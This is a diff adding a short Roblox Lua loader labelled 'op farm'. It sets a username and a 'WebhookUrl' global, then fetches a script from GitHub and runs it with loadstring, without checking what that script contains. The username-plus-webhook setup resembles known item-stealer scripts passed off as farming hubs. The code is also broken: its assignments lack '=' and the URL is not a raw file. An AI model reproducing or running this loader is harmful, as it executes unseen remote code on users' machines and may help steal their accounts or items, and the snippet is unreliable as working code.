@@ -1,0 +1,5 @@
+ _G.Username "mobilegm1"
+_G.HubName "op farm"
+_G.WebhookUrl "https://discord.gg/J9MZXZ7b"
+
+loadstring(game:HttpGet("https://github.com/Jayiioceanii/PeakOnTop/blob/main/peak.lua"))()
